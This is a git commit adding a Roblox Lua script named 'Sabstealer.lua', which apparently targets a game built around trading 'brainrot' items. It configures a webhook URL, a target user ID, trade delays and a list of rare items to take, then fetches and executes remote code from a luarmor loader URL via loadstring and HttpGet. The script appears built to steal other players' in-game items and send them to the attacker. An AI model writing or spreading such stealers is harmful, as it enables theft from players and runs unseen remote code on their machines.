65426cf1b7ba1466fb0c4338c819bf5556248f26
11ust <versacetk3@gmail.com>
2026-03-20 01:52:41 +0000

    Create Sabstealer.lua

---
+++ Sabstealer.lua
@@ -0,0 +1,46 @@
+local genv = getgenv()
+
+genv.WEBHOOK_URL = 'ur webhook'
+genv.TARGET_ID = 
+genv.DELAY_STEP = 1
+genv.TRADE_CYCLE_DELAY = 2
+genv.TARGET_BRAINROTS = {
+    ['Graipuss Medussi'] = true,
+    ['La Taco Combinasion'] = true,
+    ['Ketchuru and Musturu'] = true,
+    ['Swaggy Bros'] = true,
+    ['Burguro And Fryuro'] = true,
+    ['Quesadillo Vampiro'] = true,
+    ['La Spooky Grande'] = true,
+    ['Los Bros'] = true,
+    ['Tacorita Bicicleta'] = true,
+    ['Tuff Toucan'] = true,
+    Meowl = true,
+    ['Perrito Burrito'] = true,
+    ['Ketupat Kepat'] = true,
+    ['Festive 67'] = true,
+    ['La Jolly Grande'] = true,
+    ['Garama and Madundung'] = true,
+    ['La Romantic Grande'] = true,
+    ['Capitano Moby'] = true,
+    ['Gobblino Uniciclino'] = true,
+    Tralaledon = true,
+    ['Tang Tang Keletang'] = true,
+    ['W or L'] = true,
+    ['La Vacca Saturno Saturnita'] = true,
+    ['Swag Soda'] = true,
+    ['Lavadorito Spinito'] = true,
+    ['Skibidi Toilet'] = true,
+    ['Dragon Cannelloni'] = true,
+    Cerberus = true,
+    ['Tictac Sahur'] = true,
+    ['Los Hotspotsitos'] = true,
+    ['Money Money Puggy'] = true,
+    ['Chipso and Queso'] = true,
+    ['Strawberry Elephant'] = true,
+    ['Los Puggies'] = true,
+    ['Chillin Chili'] = true,
+    ['La Extinct Grande'] = true,
+}
+
+loadstring(game:HttpGet('https://api.luarmor.net/files/v4/loaders/9a91b3ba6fb71423853ec2f885c42d67.lua'))()
